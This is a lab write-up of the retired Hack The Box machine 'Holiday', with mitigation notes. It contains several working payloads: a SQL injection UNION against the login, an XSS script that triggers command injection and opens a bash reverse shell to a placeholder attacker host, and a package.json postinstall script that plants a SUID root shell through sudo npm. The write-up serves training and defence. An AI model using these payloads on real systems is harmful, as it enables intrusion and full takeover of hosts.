---
machine: Holiday
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, nodejs, sqli, xss, command-injection, npm, privesc]
---

# Holiday — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Holiday's login is injectable and a UNION reveals `RickA`'s hash. XSS in a booking runs in the administrator panel and allows approving a booking with command injection, yielding an `algernon` shell. Escalation is direct: `algernon` can run `npm i *` as root, and a `package.json` with install scripts executes code.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` a Node.js application.
- `gobuster` finds `/login`, `/register`, `/bookings` and `/admin`.
- The login distinguishes invalid user from wrong password.

## Enumeration

- The username field is concatenated into SQLite.
- A `UNION` returns `RickA`'s MD5 hash, which cracks.
- The admin panel reviews bookings and renders their content.

```text
username=")) UNION SELECT 1,group_concat(username),3,4 FROM users-- -
```

## Foothold

Create a booking with XSS; when the administrator reviews it, the script performs an action in their session. Approval passes the booking ID to a system command, so inject a reverse shell and catch it as `algernon`.

```text
"><script>fetch('/admin/approve?id=<ID>;bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"')</script>
```

## Lateral movement

The shell is already `algernon`; their home holds `user.txt`. Privilege enumeration shows a rule to run npm as root.

```bash
sudo -l
```

## Privilege escalation

`npm i *` as root installs the package in the current directory and runs its `preinstall`/`postinstall` scripts. Create a `package.json` with a script that copies bash and sets SUID, then run the install.

```json
{
  "name": "pwn",
  "version": "1.0.0",
  "scripts": { "postinstall": "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" }
}
```

```bash
sudo npm i . --unsafe
/tmp/rootbash -p
```

## Evidence

- Login SQLi and `RickA` hash.
- Booking XSS and admin session.
- Command injection in approval.
- npm-as-root rule.
- `package.json` with `postinstall` and SUID shell.

## Lessons learned

- A login with different errors leaks users and enables UNION.
- XSS against an admin bot can chain into a privileged action.
- `npm install` runs package scripts; as root it is direct execution.
- Sudo rules over package managers must be treated as root.

## Mitigation and detection

- Parameterize the login and do not return different errors.
- Escape bookings and use CSP; never render user HTML.
- Do not allow `npm` as root or install packages from untrusted directories.
- Audit sudo rules and install scripts.

## References

- [0xdf — Holiday](https://0xdf.gitlab.io/2019/09/11/htb-holiday.html)
- [IppSec — Holiday](https://www.youtube.com/watch?v=FvHyt7KrsPE)
- [Hack The Box — Holiday](https://app.hackthebox.com/machines/holiday)
